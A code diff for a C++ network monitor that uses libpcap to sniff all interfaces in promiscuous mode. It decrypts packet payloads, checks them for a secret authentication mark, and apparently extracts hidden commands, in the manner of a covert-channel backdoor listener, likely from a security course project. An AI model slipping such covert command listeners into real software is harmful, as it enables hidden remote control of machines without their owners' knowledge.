@@ -12,72 +12,160 @@
 #include "../shared/Logger.h"
 #include "../shared/Authenticator.h"
 #include "../shared/PacketIdentifier.h"
-#include "../shared/Crypto.h"
+#include "../shared/HCrypto.h"
 #include <sys/epoll.h>
+#include <pcap.h>
+#include <cstring>
 
+NetworkMonitor * NetworkMonitor::instance = nullptr;
 
-NetworkMonitor::NetworkMonitor(TrafficAnalyzer * trafficAnalyzer, Crypto * crypto) {
+NetworkMonitor::NetworkMonitor(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto) {
 
     this->crypto = crypto;
     this->trafficAnalyzer = trafficAnalyzer;
 
-    if((this->rawTCPSocket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0){
-        perror("rawTCPSocket creation");
+    if(!getInterface()){
+        Logger::debug("NetworkMonitor - There Was An Error Fetching The Interface For The Monitor");
+    }
+}
+
+NetworkMonitor* NetworkMonitor::getInstance(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto) {
+    if(NetworkMonitor::instance == nullptr){
+        NetworkMonitor::instance = new NetworkMonitor(trafficAnalyzer, crypto);
     }
 
-    // Set SO_REUSEADDR so that the port can be resused for further invocations of the application
-    int arg = 1;
-    if (setsockopt (this->rawTCPSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1){
-        perror("TCP - setsockopt");
-    }
+    return NetworkMonitor::instance;
+}
 
-    if((this->rawUDPSocket = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0){
-        perror("rawUDPSocket creation");
-    }
+void NetworkMonitor::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet) {
 
-    // Set SO_REUSEADDR so that the port can be resused for further invocations of the application
-    int arg2 = 1;
-    if (setsockopt (this->rawUDPSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1){
-        perror("UDP - setsockopt");
-    }
+    char * BUFFER = (char *)(packet + 16);
 
-    //IP_HDRINCL to stop the kernel from building the packet headers
-    /*{
-        int one = 1;
-        const int *val = &one;
-        if (setsockopt(this->rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
-            perror("setsockopt");
-    }*/
+    struct iphdr * ip = (struct iphdr *)BUFFER;
+    int ipHeaderLength = (ip->ihl * 4);
+    int protocol = (ip->protocol);
 
+    //just to make sure we are in the right spot
+    Logger::debug("NetworkMonitor:packetCallback - IP Header Length: " + to_string(ipHeaderLength));
+    Logger::debug("NetworkMonitor:packetCallback - Protocol: " + to_string(protocol));
 
-    //register both of these sockets with epoll
-    if((this->epollDescriptor = epoll_create(this->EPOLL_QUEUE_LENGTH)) < 0){
-        perror("Error Creating Epoll Descriptor");
-    }
+    PacketMeta meta = PacketIdentifier::generatePacketMeta(BUFFER);
+    char *applicationLayer = PacketIdentifier::findApplicationLayer(&meta);
 
-    struct epoll_event tcpEvent;
-    tcpEvent.events = EPOLLIN | EPOLLERR | EPOLLHUP | EPOLLET;
-    tcpEvent.data.fd = this->rawTCPSocket;
-
-    if(epoll_ctl(epollDescriptor, EPOLL_CTL_ADD, this->rawTCPSocket, &tcpEvent) == -1){
-        perror("Error Adding RawTCP to Epoll");
+    if(applicationLayer == nullptr){
+        Logger::debug("NetworkMonitor:listenForTraffic - Could Not Find Application Layer. Can't Do Anything With Packet");
+        return;
     }else{
-        Logger::debug("NetworkMonitor - Successfully Added TCPSocket Descriptor To The Epoll Event Loop");
+        if(NetworkMonitor::instance->crypto->decryptPacket(&meta, applicationLayer) == false){
+            Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Decrypting The Packet. Can't Use The Packet");
+            return;
+        }
     }
 
-    struct epoll_event udpEvent;
-    udpEvent.events = EPOLLIN | EPOLLERR | EPOLLHUP | EPOLLET;
-    udpEvent.data.fd = this->rawUDPSocket;
+    Logger::debug("NetworkMonitor:listenForTraffic - Decryption Complete. Now Authenticating");
+    if(Authenticator::isAuthenticPacket(BUFFER)){
 
-    if(epoll_ctl(epollDescriptor, EPOLL_CTL_ADD, this->rawUDPSocket, &udpEvent) == -1){
-        perror("Error Adding RawUDP to Epoll");
+
     }else{
-        Logger::debug("NetworkMonitor - Successfully Added UDPSocket Descriptor To The Epoll Event Loop");
+        //if it is not our packet give it to the TrafficAnalyzer
+        NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
+
     }
+
 
 }
 
+/**
+ * killListening is a helepr method so that the client can tell the NetworkMontior and libpcap to stop listening for
+ * packets
+ */
+void NetworkMonitor::killListening() {
+    if(this->currentFD != nullptr){
+        pcap_breakloop(this->currentFD);
+    }
+}
+
+bool NetworkMonitor::getInterface() {
+
+    Logger::debug("Main:getInterfaces - Initializing");
+
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_if_t * interfaces;
+    pcap_if_t * interface;
+
+    Logger::debug("Main:getInterfaces - Finding All Interfaces");
+
+    if(pcap_findalldevs(&interfaces, errbuf) == -1){
+        Logger::error("Main:getInterfaces - There Was An Error Fetching The Interfaces");
+        cerr << errbuf << endl;
+        return false;
+    }
+
+    Logger::debug("Main:getInterfaces - Looping Through All Interfaces") ;
+
+    allInterfaces = interfaces;
+    interface = interfaces;
+    while(interface != NULL){
+        const char * name = interface->name;
+
+        Logger::debug("Main:getInterfaces - Testing Interface With Name: " + string(name));
+
+        if(strcmp(name, string("any").c_str()) == 0){
+            //this is the any interface
+            Logger::debug("Main:getInterfaces - FOUND THE ANY INTERFACE");
+
+            listeningInterface = interface;
+            return true;
+        }
+
+        interface = interface->next;
+    }
+
+    return false;
+}
+
 string * NetworkMonitor::listenForTraffic() {
+
+
+    char errbuf[PCAP_ERRBUF_SIZE];
+    bpf_u_int32 subnetMask;
+    bpf_u_int32 ip;
+
+    //fetch network information for interface
+    pcap_lookupnet(listeningInterface->name, &subnetMask, &ip, errbuf);
+
+    //open up a raw socket and listen in promisc mode on it for data
+
+    if((this->currentFD = pcap_open_live(listeningInterface->name, BUFSIZ, 1, -1, errbuf)) == NULL){
+        Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error in pcap_open_live");
+        Logger::debug(string(errbuf));
+        return nullptr;
+    }
+
+    //setup the libpcap filter
+    struct bpf_program fp;
+    //compile the filter
+    if(pcap_compile(this->currentFD, &fp, "udp or tcp", 0, ip) == -1){
+        Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Compiling The Filter");
+        return nullptr;
+    }
+    //set the filter
+    if(pcap_setfilter(this->currentFD, &fp) == -1){
+        Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Setting The Filter");
+        return nullptr;
+    }
+
+    u_char* args = NULL;
+    //listen for packets
+    pcap_loop(this->currentFD, 0, NetworkMonitor::packetCallback, args);
+
+    return this->command;
+
+
+    // --------------------------------------------------------------------------------------
+
+
+/*
 
     Logger::debug("NetworkMonitor:listenForTraffic - Setting Up For Read");
     char BUFFER[IP_MAXPACKET];
@@ -124,7 +212,7 @@ string * NetworkMonitor::listenForTraffic() {
         char *applicationLayer = PacketIdentifier::findApplicationLayer(&meta);
 
         if(applicationLayer == nullptr){
-            Logger::debug("NetworkMonitor:listenForTraffic - Could No Find Application Layer. Can't Do Anything With Packet");
+            Logger::debug("NetworkMonitor:listenForTraffic - Could Not Find Application Layer. Can't Do Anything With Packet");
             continue;
         }else{
             this->crypto->decryptPacket(&meta, applicationLayer);
@@ -142,6 +230,8 @@ string * NetworkMonitor::listenForTraffic() {
 
         }
     }
+
+*/
 
 
 }
